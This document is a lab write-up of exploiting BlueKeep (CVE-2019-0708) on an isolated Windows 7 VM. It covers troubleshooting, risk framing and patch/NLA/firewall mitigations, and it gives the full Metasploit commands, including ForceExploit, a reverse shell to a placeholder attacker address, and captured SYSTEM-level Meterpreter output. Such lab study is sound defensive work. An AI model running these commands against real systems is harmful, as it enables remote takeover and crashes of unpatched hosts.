
# Lab Report: BlueKeep (CVE-2019-0708) Exploitation on Windows 7

 **Penetration Testing & Kernel Vulnerability Analysis Environment**

![Metasploit](https://shields.io)
![Windows 7](https://shields.io)
![Lab](https://shields.io)

## Project Description

This repository contains the technical documentation and troubleshooting analysis corresponding to the controlled reproduction of the **BlueKeep (CVE-2019-0708)** vulnerability on x64 architectures. The objective of this lab exercise is to analyze the behavior of critical memory corruption flaws within the Windows kernel (`IRQL_NOT_LESS_OR_EQUAL`), understand perimeter network constraints in simulated environments, and propose effective countermeasures from a defensive perspective (Blue Teaming).

---

## Environment Details

*   **Attacking Machine:** Kali Linux (`<ATTACKER_IP>` / Dedicated lab interface)
*   **Target Machine:** Windows 7 SP1 x64 (`<TARGET_IP>`)
*   **Network Layout:** Private, isolated segment (Host-Only network) within the hypervisor.

---

## ISC² Conceptual Alignment & Case Summary

This laboratory exercise serves as a practical deployment analysis of critical security frameworks defined within the **ISC² Common Body of Knowledge (CBK)**, specifically mapping to **Domain 1 (Security and Risk Management)** and **Domain 7 (Security Operations)**.

### 1. The CIA Triad Breakdown
*   **Confidentiality (High Breach):** By achieving a successful `Meterpreter` session, data confidentiality was entirely compromised. An attacker gaining `NT AUTHORITY\SYSTEM` access can read, exfiltrate, or manipulate any sensitive files, cryptographic hashes, or system memory structures.
*   **Integrity (Total Compromise):** The exploit granted unrestricted system-level command execution (`shell`). This allows for arbitrary unauthorized modifications to system files, registry configurations, binaries, and auditing logs, completely breaking system integrity.
*   **Availability (Denial of Service - BSOD):** During the troubleshooting phase, the initial memory address misalignment triggered a kernel panic (**Blue Screen of Death**). In a corporate production environment, this directly destroys Availability by causing unpredicted infrastructure downtime and crashing active business services.

### 2. Risk Management & Vulnerability Assessment
*   **Threat vs. Vulnerability:** The **vulnerability** is the unpatched Remote Desktop Services flaw in the kernel memory (CVE-2019-0708). The **threat** is the active exploit module executed from the attacker's framework. Risk is realized when a threat successfully targets an unpatched vulnerability.
*   **Risk Identification:** Shifting from legacy vectors to BlueKeep highlights that leaving remote management protocols (SMB port 445, RDP port 3389) exposed without severe access controls creates an unacceptable attack surface.
*   **Technical Risk Impact:** This lab demonstrates how a single legacy, unpatched asset can act as an immediate entry point for complete system takeover, threatening the overall security posture of the internal network segment.

---

## Analysis & Troubleshooting

During the initial deployment of the lab, multiple technical failures prevented the successful execution of the exploit. The root causes and their respective solutions are detailed below:

### Error 1: Remote Port Closed (RDP - Port 3389)
*   **Symptom:** Metasploit returned the error `Exploit aborted due to failure: unknown: Cannot reliably check exploitability. Error communicating RDP protocol`.
*   **Root Cause:** The Remote Desktop Protocol (RDP) service was not enabled on the target machine, or the system service (`TermService`) was stopped.
*   **Solution:** 
    1. Remote access was allowed through Windows 7 system properties (*"Allow connections from computers running any version of Remote Desktop"*).
    2. Forced the service to start via Windows Command Prompt (`cmd`) running as Administrator:
       ```cmd
       sc config TermService start= auto && net start TermService
       ```
    3. Validated port connectivity from Kali Linux using Netcat, confirming the service was reachable:
       ```bash
       nc -zv <TARGET_IP> 3389
       # Output: (UNKNOWN) 3389 (ms-wbt-server) open
       ```

### Error 2: Listening Address Mismatch (LHOST)
*   **Symptom:** The exploit failed to establish a return connection (Reverse TCP session).
*   **Root Cause:** The `LHOST` variable was incorrectly pointing to an external interface (NAT), preventing the target host from locating the attacker's machine within the isolated lab network segment.
*   **Solution:** Manually updated the listening IP address parameter to match the specific local subnet allocated for the lab exercise (`<ATTACKER_IP>`).

### Error 3: Memory Instability & Blue Screen of Death (BSOD)
*   **Symptom:** Upon forcing the attack, the target machine suffered a critical operating system crash, displaying a blue screen with the stop code `IRQL_NOT_LESS_OR_EQUAL`.
*   **Root Cause:** BlueKeep is a highly volatile exploit that directly manipulates kernel pool memory. By deploying the `ForceExploit True` flag to bypass safety scanners, a microscopic misalignment in memory address allocation triggered physical memory corruption.
*   **Solution:** Initiated a hard reset of the virtual machine via the hypervisor menu, selected the *"Start Windows Normally"* option on recovery, and re-executed the attack vector once services stabilized.

---

## Phase 2: Final Configuration & Successful Exploitation

Once the network configurations and target system services were properly aligned, the exploit was launched definitively, overriding strict safety checks.

### Executed Metasploit Commands:
```bash
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>
set LPORT 4446
set ForceExploit true
run
```

### Results & Captured Shell
During the final attempt, the exploit successfully executed the **CHUNK grooming strategy** inside the kernel memory without causing a crash, injecting and running the payload seamlessly.

```text
[*] Sending stage (248902 bytes) to <TARGET_IP>
[*] Meterpreter session 1 opened (<ATTACKER_IP>:4446 -> <TARGET_IP>:49158)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > shell
Process 2384 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>hostname
<TARGET_HOSTNAME>
```

**Conclusion:** Unrestricted remote command execution was achieved with the highest level of operating system privileges (**`NT AUTHORITY\SYSTEM`**), granting complete control over the target host machine.

---

## Mitigation & Remediation

To safeguard real-world enterprise environments against the BlueKeep vulnerability, the following defensive remediations should be strictly applied:

1. **Security Update (Official Patch):** Immediately deploy the official security update issued by Microsoft in May 2019 (available even for legacy/out-of-support systems like Windows 7 and Windows Server 2008).
2. **Enable NLA (Network Level Authentication):** Configure the RDP service to mandate Network Level Authentication. This significantly mitigates the threat vector by forcing an attacker to authenticate with valid credentials before they can interact with the kernel memory.
3. **Perimeter Port Blocking:** Filter or entirely drop incoming traffic to TCP Port 3389 at the perimeter firewalls to prevent RDP exposition to public or untrusted networks.

---

## Disclaimer

The content of this repository is intended strictly for educational, research, and authorized security auditing purposes within a controlled lab environment. The author accepts no liability for any misuse of the tools, commands, or concepts described herein, nor for any damage caused to third-party systems without explicit, prior authorization.
